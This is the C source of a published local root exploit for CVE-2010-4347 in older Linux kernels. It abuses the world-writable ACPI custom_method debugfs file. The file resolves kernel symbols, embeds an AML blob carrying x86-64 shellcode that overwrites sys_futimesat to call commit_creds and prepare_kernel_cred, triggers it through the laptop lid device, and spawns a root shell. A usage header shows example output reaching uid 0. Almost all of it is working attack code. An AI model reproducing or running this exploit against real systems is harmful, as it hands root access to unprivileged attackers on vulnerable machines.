/*
 * american-sign-language.c
 *
 * Linux Kernel < 2.6.37-rc2 ACPI custom_method Privilege Escalation
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4347
 *
 *   This custom_method file allows to inject custom ACPI methods into the ACPI
 *   interpreter tables. This control file was introduced with world writeable
 *   permissions in Linux Kernel 2.6.33.
 *
 * Usage:
 *
 *   $ gcc american-sign-language.c -o american-sign-language
 *   $ ./american-sign-language
 *   [+] resolving required symbols...
 *   [+] checking for world-writable custom_method...
 *   [+] checking for an ACPI LID device...
 *   [+] poisoning ACPI tables via custom_method...
 *   [+] triggering ACPI payload via LID device...
 *   [+] triggering exploit via futimesat...
 *   [+] launching root shell!
 *   # id
 *   uid=0(root) gid=0(root) groups=0(root)
 *
 * Notes:
 *
 *   This vuln allows us to write custom ACPI methods and load them into the
 *   kernel as an unprivileged user. We compile some fancy ASL down to AML
 *   that overrides the ACPI method used when the status of the LID device is
 *   queried (eg. 'open' or 'closed' lid on a laptop). When the method is
 *   triggered, it overlays an OperationRegion on the physical address where
 *   sys_futimesat is located and overwrites the memory via the Store to
 *   escalate privileges whenever sys_futimesat is called.
 *
 *   The payload is 64-bit only and depends on the existence of a LID device
 *   (eg. laptop), but the exploit will still tell you if you're vulnerable
 *   regardless. If you don't know how to work around these limitations, you
 *   probably shouldn't be running this in the first place. :-P
 *
 *   Props to taviso, spender, kees, bliss, pipacs, twiz, stealth, and #brownpants
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>

/*
 * The ASL payload looks like:
 *
 * DefinitionBlock ("lid.aml", "SSDT", 2, "", "", 0x00001001) {
 *   Method (\_SB.LID._LID, 0, NotSerialized) {
 *     OperationRegion (KMEM, SystemMemory, PHYADDR, 0x392)
 *     Field(KMEM, AnyAcc, NoLock, Preserve) {
 *       HACK, 0x392
 *     }
 *     Store (Buffer () {
 *       0x55, 0x48, 0x89, 0xe5, 0x53, 0x48, 0x83, 0xec,
 *       0x08, 0x48, 0xc7, 0xc3, 0x24, 0x24, 0x24, 0x24,
 *       0x48, 0xc7, 0xc0, 0x24, 0x24, 0x24, 0x24, 0xbf,
 *       0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89,
 *       0xc7, 0xff, 0xd3, 0x48, 0xc7, 0xc0, 0xb7, 0xff,
 *       0xff, 0xff, 0x48, 0x83, 0xc4, 0x08, 0x5b, 0xc9,
 *       0xc3 }, HACK)
 *     Return (One)
 *   }
 * }
 *
 * Feel free to `iasl -d` this is you don't trust me! ;-)
 */
#define PAYLOAD_AML \
"\x53\x53\x44\x54\x90\x00\x00\x00\x02\x3e\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00\x49\x4e\x54\x4c" \
"\x21\x05\x09\x20\x14\x4b\x06\x5c\x2f\x03\x5f\x53\x42\x5f\x4c\x49" \
"\x44\x5f\x5f\x4c\x49\x44\x00\x5b\x80\x4b\x4d\x45\x4d\x00\x0c\xe0" \
"\x61\x17\x01\x0b\x92\x03\x5b\x81\x0c\x4b\x4d\x45\x4d\x00\x48\x41" \
"\x43\x4b\x42\x39\x70\x11\x34\x0a\x31\x55\x48\x89\xe5\x53\x48\x83" \
"\xec\x08\x48\xc7\xc3\x24\x24\x24\x24\x48\xc7\xc0\x24\x24\x24\x24" \
"\xbf\x00\x00\x00\x00\xff\xd0\x48\x89\xc7\xff\xd3\x48\xc7\xc0\xb7" \
"\xff\xff\xff\x48\x83\xc4\x08\x5b\xc9\xc3\x48\x41\x43\x4b\xa4\x01"
#define PAYLOAD_LEN 144

#define CUSTOM_METHOD "/sys/kernel/debug/acpi/custom_method"
#define HEY_ITS_A_LID "/proc/acpi/button/lid/LID/state"

unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	struct utsname ver;
	int ret;
	int rep = 0;
	int oldstyle = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			goto fallback;
		oldstyle = 1;
	}

repeat:
	ret = 0;
	while(ret != EOF) {
		if (!oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;
fallback:
	uname(&ver);
	if (strncmp(ver.release, "2.6", 3))
		oldstyle = 1;
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL)
		return 0;
	rep = 1;
	goto repeat;
}

int
main(int argc, char **argv)
{
	int ret;
	FILE *fp;
	char buf[64];
	struct stat sb;
	char payload[PAYLOAD_LEN] = PAYLOAD_AML;
	unsigned long sys_futimesat, prepare_kernel_cred, commit_creds;

	printf("[+] resolving required symbols...\n");

	sys_futimesat = get_symbol("sys_futimesat");
	if (!sys_futimesat) {
		printf("[-] sys_futimesat symbol not found, aborting!\n");
		exit(1);
	}

	prepare_kernel_cred = get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] prepare_kernel_cred symbol not found, aborting!\n");
		exit(1);
	}

	commit_creds = get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] commit_creds symbol not found, aborting!\n");
		exit(1);
	}

	printf("[+] checking for world-writable custom_method...\n");

	ret = stat(CUSTOM_METHOD, &sb);
	if (ret < 0) {
		printf("[-] custom_method not found, kernel is not vulnerable!\n");
		exit(1);
	}

	if (!(sb.st_mode & S_IWOTH)) {
		printf("[-] custom_method not world-writable, kernel is not vulnerable!\n");
		exit(1);
	}

	printf("[+] checking for an ACPI LID device...\n");

	ret = stat(HEY_ITS_A_LID, &sb);
	if (ret < 0) {
		printf("[-] ACPI LID device not found, but kernel is still vulnerable!\n");
		exit(1);
	}

	if (sizeof(sys_futimesat) != 8) {
		printf("[-] payload is 64-bit only, but kernel is still vulnerable!\n");
		exit(1);
	}

	sys_futimesat &= ~0xffffffff80000000;
	memcpy(&payload[63], &sys_futimesat, 4);
	memcpy(&payload[101], &commit_creds, 4);
	memcpy(&payload[108], &prepare_kernel_cred, 4);

	printf("[+] poisoning ACPI tables via custom_method...\n");

	fp = fopen(CUSTOM_METHOD, "w");
	fwrite(payload, 1, sizeof(payload), fp);
	fclose(fp);

	printf("[+] triggering ACPI payload via LID device...\n");

	fp = fopen(HEY_ITS_A_LID, "r");
	fread(&buf, 1, sizeof(buf), fp);
	fclose(fp);

	printf("[+] triggering exploit via futimesat...\n");

	ret = futimesat(0, "/tmp", NULL);

	if (ret != -1 || errno != EDOTDOT) {
		printf("[-] unexpected futimesat errno, exploit failed!\n");
		exit(1);
	}

	if (getuid() != 0) {
		printf("[-] privileges not escalated, exploit failed!\n");
		exit(1);
	}

	printf("[+] launching root shell!\n");
	execl("/bin/sh", "/bin/sh", NULL);
}